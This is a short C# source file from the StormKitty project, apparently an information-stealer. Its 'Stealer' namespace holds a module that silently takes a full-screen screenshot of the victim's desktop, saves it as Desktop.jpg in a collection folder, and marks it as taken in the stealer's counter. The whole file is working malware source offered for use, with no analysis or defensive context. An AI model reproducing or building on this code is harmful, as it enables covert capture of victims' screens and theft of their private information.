/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Drawing;
using System.Drawing.Imaging;

namespace Stealer
{
    internal sealed class DesktopScreenshot
    {
        public static bool Make(string sSavePath)
        {
            try
            {
                Rectangle bounds = System.Windows.Forms.Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
                }
                Counter.DesktopScreenshot = true;
                return true;
            }
            catch { return false; }
        }
    }
}
